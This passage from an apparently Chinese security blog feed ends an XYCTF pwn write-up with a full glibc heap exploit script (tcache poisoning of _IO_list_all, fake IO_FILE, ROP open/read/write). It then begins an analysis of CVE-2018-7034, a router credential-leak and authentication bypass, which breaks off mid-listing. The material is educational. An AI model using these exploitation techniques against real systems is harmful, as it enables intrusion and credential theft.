src="/../picture/2025XYCTFpwn-wp/21.png"><br>上面这一段C++伪代码大致和下面的C语言逻辑相同<br><img src="/../picture/2025XYCTFpwn-wp/22.png"><br>因此我们思路大致就是利用这个UAF实现任意地址写,控制<code>IO_list_all</code>最后使用<code>House of apple</code> 或者 <code>House of cat</code>来打ORW实现flag的读取</p><p>这里由于本人构造的<code>fake_IO</code>只在本地打通，并且不知道为什么远程打不通(后续知道原因后会对本篇文章进行更新)，所以为了不误导其他人，这里只做<code>如何达成任意地址写来控制IO_list_all</code>的分享具体我是如何构造<code>fake_IO</code>的就不过多介绍了，因为我只是个套板子的小鬼罢了不知道哪里有问题(我在百度网盘分享的文件中有别的队伍师傅的wp大家可以学习别的师傅是如何构造打通远程的)</p><p>由于bins中空的块太多了，所以为了不让原本的chunk干扰到我们构造，我选择了使用0x250大小的堆块</p><p>使用的方法为<code>House of botcake</code><br>具体构造如下所示，<br><img src="/../picture/2025XYCTFpwn-wp/23.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">menu = <span class="string">&quot;&gt; &quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x240</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 0-9</span></span><br><span class="line">  </span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 这个用来伪造IO chunk10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x203B20</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">IO_list_all = libc_base + <span class="number">0x2044C0</span></span><br><span class="line">leak(<span class="string">&quot;IO_list_all&quot;</span>, IO_list_all)</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x15C40</span></span><br><span class="line">leak(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br><span class="line">tcache_chunk = heap_base + <span class="number">0x15EA0</span></span><br><span class="line">leak(<span class="string">&quot;tcache_chunk&quot;</span>, tcache_chunk)</span><br><span class="line">fake_IO_addr = heap_base + <span class="number">0x16330</span></span><br><span class="line">leak(<span class="string">&quot;fake_IO_addr&quot;</span>, fake_IO_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x240</span>, <span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 这里把整个unsortedbin申请出来就可以控制tcache指针了</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">250</span>)</span><br><span class="line">payload += p64(IO_list_all ^ (tcache_chunk &gt;&gt; <span class="number">12</span>))</span><br><span class="line"><span class="comment"># 这里绕过tcache的指针加密，将指针修改为IO_list_all</span></span><br><span class="line">add(<span class="number">0x6e0</span>, payload)</span><br><span class="line">add(<span class="number">0x240</span>, <span class="string">b&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x240</span>, p64(fake_IO_addr))</span><br><span class="line">add(<span class="number">0x600</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 防止被合并 11</span></span><br><span class="line">free(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>效果如下:<br><img src="/../picture/2025XYCTFpwn-wp/24.png"><br>我的完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./heap2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line">menu = <span class="string">&quot;&gt; &quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x240</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 0-9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 这个用来伪造IO chunk10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x203B20</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">IO_list_all = libc_base + <span class="number">0x2044C0</span></span><br><span class="line">leak(<span class="string">&quot;IO_list_all&quot;</span>, IO_list_all)</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x15C40</span></span><br><span class="line">leak(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br><span class="line">tcache_chunk = heap_base + <span class="number">0x15EA0</span></span><br><span class="line">leak(<span class="string">&quot;tcache_chunk&quot;</span>, tcache_chunk)</span><br><span class="line">fake_IO_addr = heap_base + <span class="number">0x16330</span> + <span class="number">0x510</span></span><br><span class="line">leak(<span class="string">&quot;fake_IO_addr&quot;</span>, fake_IO_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x240</span>, <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 这里把整个unsortedbin申请出来就可以控制tcache指针了</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">250</span>)</span><br><span class="line">payload += p64(IO_list_all ^ (tcache_chunk &gt;&gt; <span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x6e0</span>, payload)</span><br><span class="line">add(<span class="number">0x240</span>, <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x240</span>, p64(fake_IO_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面开始伪造fake_IO结构体</span></span><br><span class="line">chunk3 = fake_IO_addr <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010f75b</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000110a4d</span><span class="comment">#: pop rsi; ret;</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x00000000000ab891</span><span class="comment">#: pop rdx; or byte ptr [rcx - 0xa], al; ret;</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x00000000000dd237</span><span class="comment">#: pop rax; ret;</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000098fb6</span><span class="comment">#: syscall; ret;</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000001169a3</span><span class="comment">#: ret;</span></span><br><span class="line"><span class="comment"># ret = pop_rdi_ret + 1</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line"><span class="comment"># open_addr = libc_base + libc.sym[&#x27;open&#x27;]</span></span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">leak(<span class="string">&#x27;setcontext&#x27;</span>, setcontext)</span><br><span class="line">leak(<span class="string">&#x27;IO_wfile_jumps&#x27;</span>, IO_wfile_jumps)</span><br><span class="line"><span class="comment"># leak(&#x27;open_addr&#x27;, open_addr)</span></span><br><span class="line">leak(<span class="string">&#x27;read_addr&#x27;</span>, read_addr)</span><br><span class="line">leak(<span class="string">&#x27;write_addr&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(chunk3+<span class="number">0x8</span>)  </span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)  </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(chunk3+<span class="number">0xf8</span>)+p64(system_addr) <span class="comment">#rdi,rsi</span></span><br><span class="line">fake_IO_FILE += p64(heap_base)              </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0x100</span>)                       <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(chunk3 + <span class="number">0x8</span>)                  <span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE += p64(chunk3 + <span class="number">0xf0</span>) + p64(ret)      <span class="comment">#rsp</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps + <span class="number">0x30</span>)        <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) +  p64(chunk3+<span class="number">0xc8</span>)</span><br><span class="line">fake_IO_FILE += p64(read_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x600</span>,fake_IO_FILE) <span class="comment"># 布置fake_IO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw  = p64(pop_rdi_ret) + p64(heap_base+<span class="number">88576</span>)  </span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall_ret)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base+<span class="number">0x100</span>)</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base+<span class="number">0x100</span>)</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(orw)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, 1)</span></span><br><span class="line"><span class="comment"># x/30gx $rebase(0x0051B0)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>本地打通的效果:<br><img src="/../picture/2025XYCTFpwn-wp/25.png"></p><h3 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a><strong>奶龙回家</strong></h3><h3 id="web苦手"><a href="#web苦手" class="headerlink" title="web苦手"></a>web苦手</h3><h3 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h3><p>没打出来，好累啊，不想复现了，有空再做吧(咕咕咕… …)</p><p>XYCTF的师傅们都是无偿出题，感谢所有XYCTF出题的师傅，明年我还来打<code>(〃&#39;▽&#39;〃)</code></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）</title>
      <link href="/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/"/>
      <url>/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>漏洞编号<code>CVE-2018-7034</code>，影响<code>D-Link</code>和<code>TrendNet</code>的一些老设备。</p><p>通过网盘分享的文件：TEW751DR_FW103B03.bin<br>链接: <a href="https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp">https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp</a> 提取码: xidp</p><p>这里分析的是<code>TrendNet TEW751</code>的固件，此外<code>D-Link</code>的一些老设备，如<code>DIR645</code>，<code>DIR815</code>等也都受该漏洞影响。</p><h3 id="基础工具配置"><a href="#基础工具配置" class="headerlink" title="基础工具配置"></a><strong>基础工具配置</strong></h3><p>复现环境 <code>Ubuntu 24.04.2 LTS</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/1.png"></p><p>基础工具配置可以参考这篇文章中的配置: <a href="https://xz.aliyun.com/news/18079">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>存在漏洞的地方为 <code>/squashfs-root/htdocs/web/getcfg.php</code></p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/2.png"></p><p>这里通过 <code>$AUTHORIZED_GROUP</code> 变量判断用户权限<br>而 <code>$GETCFG_SVC = cut($_POST[&quot;SERVICES&quot;], $SERVICE_INDEX, &quot;,&quot;);</code> 中，<code>$GETCFG_SVC</code> 是通过 <code>POST</code> 传入的 <code>$_POST[&quot;SERVICES&quot;]</code> 所以这里文件的加载是我们可控的，也就是我们可以控制 <code>/htdocs/webinc/getcfg/</code> 这个路径下的文件加载，这显然存在一个我们可以利用的地方，所以我们需要进入到 <code>else分支</code> 中，也就是说我们的 <code>$AUTHORIZED_GROUP</code> 变量应该 <code>大于等于0</code></p><p>我们进入这个路径 <code>/htdocs/webinc/getcfg/</code> 看看有什么文件是我们可以利用的<br>通过观察我们发现 <code>/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php</code> 这个文件</p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/3.png"></p><p>这段代码的作用是遍历系统路径<code>/device/account/entry</code>下的所有账户条目，并且使用echo输出，并且echo输出的条目包括<code>用户名和密码</code>，所以我们可通过这个加载文件泄露账号</p><p>但是，我们首先还是得先知道如何绕过全局变量 <code>$AUTHORIZED_GROUP &gt;= 0</code> 的检查<br>我们在 <code>squashfs-root</code> 文件夹中使用命令 <code>grep -ra &#39;AUTHORIZED_GROUP&#39;</code> 来寻找都有哪些文件含有控制 <code>$AUTHORIZED_GROUP</code> 变量的功能</p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/4.png"><br>得到的结果如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">htdocs/webinc/templates.php:<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/js/&quot;</span>.$TEMP_MYNAME.<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span>  &amp;&amp; $AUTHORIZED_GROUP &gt;= <span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:var AUTH = new Authenticate(&lt;?=$AUTHORIZED_GROUP?&gt;, &lt;?echo query(<span class="string">&quot;/device/session/timeout&quot;</span>);?&gt;);</span><br><span class="line">htdocs/webinc/templates.php:var PAGE = &lt;? <span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/js/&quot;</span>.$TEMP_MYNAME.<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>) echo <span class="string">&quot;new Page();&quot;</span>; <span class="keyword">else</span> echo <span class="string">&quot;null;&quot;</span>; ?&gt;</span><br><span class="line">htdocs/webinc/templates.php:<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/js/info.php:<span class="comment">//TRACE_error(&quot;AUTHORIZED_GROUP=&quot;.$_GET[&quot;AUTHORIZED_GROUP&quot;]);</span></span><br><span class="line">htdocs/web/dlnastate.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/check_stats.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/wandetect.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/wpsstate.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/session_act.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/log_clear.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP==<span class="number">0</span>)</span><br><span class="line">htdocs/web/wifi_stat.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/routing_stat.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/firmversion.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/js/postxml.js:self.AuthorizedGroup = xml.Get(<span class="string">&quot;/report/AUTHORIZED_GROUP&quot;</span>);</span><br><span class="line">htdocs/web/wiz_freset.php:<span class="keyword">if</span>(query(<span class="string">&quot;/runtime/device/devconfsize&quot;</span>)==<span class="string">&quot;0&quot;</span>) $AUTHORIZED_GROUP = <span class="number">0</span>;</span><br><span class="line">htdocs/web/DevInfo.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span 